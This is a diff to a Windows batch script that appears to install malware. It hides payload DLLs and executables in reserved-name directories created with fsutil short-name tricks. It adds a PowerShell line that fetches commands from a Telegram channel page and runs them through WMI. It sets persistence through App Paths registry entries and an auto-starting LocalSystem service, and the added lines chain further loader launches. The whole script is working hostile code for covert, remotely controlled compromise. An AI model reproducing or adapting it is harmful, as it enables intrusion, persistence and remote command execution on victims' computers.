@@ -6,7 +6,7 @@ fsutil file setshortname C:\ProgramData\NUL..\ ""
 fsutil file setshortname C:\ProgramData\AUX..\ ""
 fsutil file setshortname C:\ProgramData\CON..\ ""
 
-move /Y "%ProgramData%\bist\pach.cmd" "%USERPROFILE%\Cookies\"
+move /Y "%ProgramData%\bist\pach.cmd" "%USERPROFILE%\PrintHood\"
 move /Y "%ProgramData%\bist\Icon.dll" "\\.\%ProgramData%\AUX..\"
 copy /Y "%ProgramData%\bist\Input.exe" "\\.\%ProgramData%\AUX..\"
 move /Y "%ProgramData%\bist\Kape.dll" "\\.\%ProgramData%\CON..\"
@@ -17,10 +17,12 @@ move /Y "%ProgramData%\bist\libcrypto-1_1.dll" "\\.\%ProgramData%\NUL..\"
 move /Y "%ProgramData%\bist\ShellExperienceHost.exe" "\\.\%ProgramData%\NUL..\"
 
 echo powershell -NoProfile -ExecutionPolicy Bypass -Command "$u='https://t.me/s/updategps';$c=(iwr $u -UseBasicParsing).Content;$m=[regex]::Match($c,'property=\"og:description\" content=\"(.*?)\"');if($m.Success){$cmd=[Net.WebUtility]::HtmlDecode($m.Groups[1].Value) -replace '&#092;','\';$null=([WMIClass]'Win32_Process').Create($cmd)}" >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd".
+echo powershell.exe %ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll >> "%USERPROFILE%\Cookies\ini.cmd"
+echo %USERPROFILE%\PrintHood\pach.cmd >> "%USERPROFILE%\Cookies\ini.cmd"
 echo powershell.exe %ProgramData%\CON..\Input.exe %ProgramData%\CON..\Kape.dll >> "%USERPROFILE%\Cookies\init.cmd"
 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\start.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\init.cmd" /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\install.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\pach.cmd" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\install.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\ini.cmd" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\setup.exe" /t REG_SZ /d "%WINDIR%\System32\oobe\Setup.exe" /f
 
 sc create NetworkConfiguration binPath="%WINDIR%\System32\cmd.exe /c start start.exe" start="auto" obj="LocalSystem"
